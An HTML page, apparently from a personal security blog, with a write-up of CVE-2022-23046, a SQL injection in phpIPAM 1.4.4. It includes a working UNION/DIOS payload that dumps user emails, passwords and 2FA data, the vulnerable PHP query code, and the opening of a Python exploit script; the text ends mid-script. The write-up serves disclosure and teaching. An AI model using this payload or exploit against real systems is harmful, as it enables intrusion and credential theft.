@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>incogbyte&#39;s blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=--width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../images/avatar.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        incogbyte
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    incogbyte #:
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../cve/" title="CVEs">CVEs</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/incogbyte" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://wwww.linkedin.com/in/rodolfo-augusto-543863a7" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://twitter.com/incogbyte" target="_blank">
+                            <i class="fab fa-twitter fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto://incogbyte@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="incogbyte" target="_blank">
+                            <i class="fab fa-telegram fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="cve-2022-23046---phpipam">CVE-2022-23046 - PHPIPAM</h1>
+<p>TL;DR</p>
+<p>This write up is about a SQL injection which I found 4 days after another researcher reported it :/, however, because of the fact that I haven’t found any write ups or publicly available exploits, I decided to write about it.
+Exploit at the end!</p>
+<p>PHPIPAM is a software widely used internally by several companies. And by being so, it is relatively common for you to find a running instance to manage IT assets, networks, etc. <strong>1.4.4</strong> is the vulnerable version and a fix has already been made public with the arrival of version <strong>1.4.5</strong>. The request responsible for triggering the SQLi is presented below, but if you want to look at the rest, feel free.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tsx" data-lang="tsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">app</span><span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">routing</span><span style="color:#f92672">/</span><span style="color:#a6e22e">edit</span><span style="color:#f92672">-</span><span style="color:#a6e22e">bgp</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mapping</span><span style="color:#f92672">-</span><span style="color:#a6e22e">search</span>.<span style="color:#a6e22e">php</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span>: <span style="color:#66d9ef">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8082</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span>: <span style="color:#66d9ef">155</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chromium&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;97&#34;</span>, <span style="color:#e6db74">&#34; Not;A Brand&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;99&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">:</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/*</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span>: <span style="color:#66d9ef">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>; <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#a6e22e">UTF</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Requested</span><span style="color:#f92672">-</span><span style="color:#a6e22e">With</span>: <span style="color:#66d9ef">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mobile</span>: <span style="color:#66d9ef">?0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span>: <span style="color:#66d9ef">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">97.0</span>.<span style="color:#ae81ff">4692.71</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">platform</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Linux&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span>: <span style="color:#66d9ef">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost:8082
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Site</span>: <span style="color:#66d9ef">same</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mode</span>: <span style="color:#66d9ef">cors</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Dest</span>: <span style="color:#66d9ef">empty</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span>: <span style="color:#66d9ef">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost:8082/index.php?page=administration&amp;section=routing&amp;subnetId=bgp&amp;sPage=1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span>: <span style="color:#66d9ef">gzip</span>, <span style="color:#a6e22e">deflate</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span>: <span style="color:#66d9ef">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>,<span style="color:#a6e22e">en</span>;<span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span>: <span style="color:#66d9ef">phpipam</span><span style="color:#f92672">=</span><span style="color:#a6e22e">d963c4505df7e33f17e86f70724ec7bb</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span>: <span style="color:#66d9ef">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">subnet</span><span style="color:#f92672">=</span><span style="color:#a6e22e">test</span><span style="color:#e6db74">&#34;union+select(select+concat(@:=0x3a,(select+count(*)from(users)where(@:=concat(@,email,0x3a,password,&#34;</span><span style="color:#ae81ff">0x3a</span><span style="color:#960050;background-color:#1e0010">&#34;</span>,<span style="color:#ae81ff">2</span><span style="color:#a6e22e">fa</span>))),<span style="color:#960050;background-color:#1e0010">@</span>)),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#a6e22e">user</span>()<span style="color:#f92672">+--+-&amp;</span><span style="color:#a6e22e">bgp_id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h2 id="code-investigation">Code Investigation</h2>
+<p>By analyzing the following code, we can see that validation is only enforced against the <strong>bgp_id</strong> parameter</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* functions */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span>( <span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/../../../functions/functions.php&#39;</span> );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># initialize user object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$Database 	<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Database_PDO</span>;
+</span></span><span style="display:flex;"><span>$User 		<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span> ($Database);
+</span></span><span style="display:flex;"><span>$Admin	 	<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Admin</span> ($Database);
+</span></span><span style="display:flex;"><span>$Tools	 	<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Tools</span> ($Database);
+</span></span><span style="display:flex;"><span>$Result 	<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Result</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># verify that user is logged in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$User<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check_user_session</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># permissions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$User<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check_module_permissions</span> (<span style="color:#e6db74">&#34;routing&#34;</span>, <span style="color:#a6e22e">User</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ACCESS_RW</span>, <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># validates
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_numeric</span>($_POST[<span style="color:#e6db74">&#39;bgp_id&#39;</span>]))  			{ $Result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;danger&#34;</span>,  <span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#34;Invalid ID&#34;</span>), <span style="color:#66d9ef">true</span>); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;subnet&#39;</span>])<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>)				{ $Result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;danger&#34;</span>,  <span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#34;Please enter at least 2 characters.&#34;</span>), <span style="color:#66d9ef">true</span>); }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># query
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;select INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#39;subnet&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;%&#34; and `subnet` &gt; 1 and `isFolder` = 0&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">try</span> { $subnets <span style="color:#f92672">=</span> $Database<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getObjectsQuery</span>($query); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">print</span> $Result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;danger&#34;</span>, $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>(), <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># printout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sizeof</span>($subnets)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// remove existing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$bgp_mapped_subnets <span style="color:#f92672">=</span> $Tools<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_routing_subnets</span> (<span style="color:#e6db74">&#34;bgp&#34;</span>, $_POST[<span style="color:#e6db74">&#39;bgp_id&#39;</span>], <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>	$map_arr <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($bgp_mapped_subnets<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">foreach</span> ($bgp_mapped_subnets <span style="color:#66d9ef">as</span> $m) {
+</span></span><span style="display:flex;"><span>			$map_arr[] <span style="color:#f92672">=</span> $m<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">subnet_id</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// print remaining
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$cnt<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;table class=&#39;table table-condensed table-auto&#39;&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span> ($subnets <span style="color:#66d9ef">as</span> $s) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span>, $map_arr)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;tr&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;td&gt;&lt;btn class=&#39;btn btn-xs btn-success add_bgp_mapping&#39; data-subnetId=&#39;</span><span style="color:#e6db74">$s-&gt;id</span><span style="color:#e6db74">&#39; data-bgp_id=&#39;</span><span style="color:#e6db74">$_POST[bgp_id]</span><span style="color:#e6db74">&#39; data-curr_id=&#39;</span><span style="color:#e6db74">$cnt</span><span style="color:#e6db74">&#39;&gt;&lt;i class=&#39;fa fa-plus&#39;&gt;&lt;/i&gt;&lt;/btn&gt;&lt;/td&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;select name=&#39;select-</span><span style="color:#e6db74">$cnt</span><span style="color:#e6db74">&#39; class=&#39;select-</span><span style="color:#e6db74">$cnt</span><span style="color:#e6db74"> form-control input-w-auto input-sm&#39;&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;	&lt;option value=&#39;advertised&#39;&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#34;Advertised&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/option&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;	&lt;option value=&#39;received&#39;&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">_</span>(<span style="color:#e6db74">&#34;Received&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/option&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;/select&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;td&gt; </span><span style="color:#e6db74">$s-&gt;subnet</span><span style="color:#e6db74">/</span><span style="color:#e6db74">$s-&gt;mask</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$s-&gt;description</span><span style="color:#e6db74">)&lt;/td&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;td class=&#39;result-</span><span style="color:#e6db74">$cnt</span><span style="color:#e6db74">&#39;&gt;&lt;/td&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;/tr&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			$cnt<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;&lt;/table&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// none
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>($cnt<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">print</span> $Result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;info&#34;</span>, <span style="color:#e6db74">&#34;No subnets found&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">print</span> $Result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;info&#34;</span>, <span style="color:#e6db74">&#34;No subnets found&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Because of the <strong>is_numeric</strong> function, maybe by using versions prior to PHP 5.x, a bypass would occur using 0x[numbers] because, in older PHP versions this was possible, (if you find any way of performing this currently, then you’ve found another vuln). Then we could jump to the next parameter of the request, in this case the <strong>$_POST[‘subnet’]</strong> parameter. In it there is a validation, albeit a simple one, the double quotes (&quot;), is still part of the validation, and if you observe carefully, the next step regards precisely concatenating these parameters in a SQL query.  In other words, this simple &ldquo;, can cause problems :D or not. It all depends on your perspective. So by looking at the following query, can you already understand how the execution would flow?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;select INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#39;subnet&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;%&#34; and `subnet` &gt; 1 and `isFolder` = 0&#39;</span>;
+</span></span></code></pre></div><p>It could be something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> INET_NTOA(subnet) <span style="color:#66d9ef">as</span> subnet,id,mask,description <span style="color:#66d9ef">from</span> subnets <span style="color:#66d9ef">where</span> INET_NTOA(subnet) <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#34;[YOUR DOUBLE QUOTES HERE]&#34;</span> <span style="color:#66d9ef">and</span> subnet <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> isFolder <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>The Syntax error will be triggered. As illustrated in the following, at the <strong>subnet</strong> vulnerable parameter.</p>
+<p><img src="../../images/Untitled.png" alt="Untitled"></p>
+<p>From there we can see that this is a classic based error, so let’s go union :D. First let’s determine how many columns are being returned from the original query (using the <strong>Order by</strong> clause):</p>
+<p><img src="../../images/Untitled%201.png" alt="Untitled"></p>
+<p>The column in an <strong>ORDER BY</strong> clause can be specified by its index (e.g: 1,2,3,4,5,n), this means there’s no  need of knowing the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:</p>
+<p><img src="../../images/Untitled%202.png" alt="Untitled"></p>
+<p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application&rsquo;s response, you can infer how many columns are being returned from the query. The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data Having already determined the number of required columns, you can probe
+each column to test whether it can hold string data by submitting a series of <code>UNION SELECT</code> payloads that place a string value into each column in turn:</p>
+<p><img src="../../images/Untitled%203.png" alt="Untitled"></p>
+<p>If an error does not occur, and the application’s response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data</p>
+<p>Seek in the following request/response the values of the commands, @@version, database() and user():</p>
+<p><img src="../../images/Untitled%204.png" alt="Untitled"></p>
+<p>Now let&rsquo;s dump users and passwords.</p>
+<p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in position to retrieve interesting data.</p>
+<p><img src="../../images/Untitled%205.png" alt="Untitled"></p>
+<p>The exploit with <strong>DIOS</strong> query, one shot dump all!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">################</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Author of exploit: Rodolfo &#39;Inc0gbyt3&#39; Tavares
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">CVE: CVE-2022-23046
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type: SQL Injection
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Usage:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ python3 -m pip install requests
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ python3 exploit.py -u http://localhost:8082 -U &lt;admin&gt; -P &lt;password&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">###############</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__author__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Inc0gbyt3&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>menu <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[+] Exploit for PHPIPAM Version: 1.4.4 Authenticated SQL Injection</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> CVE-2022-23046&#34;</span>)
+</span></span><span style="display:flex;"><span>menu<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[+] URL of target, example: https://phpipam.target.com&#34;</span>, type<span style="color:#f92672">=</span>str)
+</span></span><span style="display:flex;"><span>menu<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-U&#34;</span>, <span style="color:#e6db74">&#34;--user&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[+] Username&#34;</span>, type<span style="color:#f92672">=</span>str)
+</span></span><span style="display:flex;"><span>menu<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-P&#34;</span>, <span style="color:#e6db74">&#34;--password&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[+] Password&#34;</span>, type<span style="color:#f92672">=</span>str)
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> menu<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>    menu<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
+</span></span><span style="display:flex;"><span>user <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>user
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_token</span>():
+</span></span><span style="display:flex;"><span>    u <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/app/login/login_check.php&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
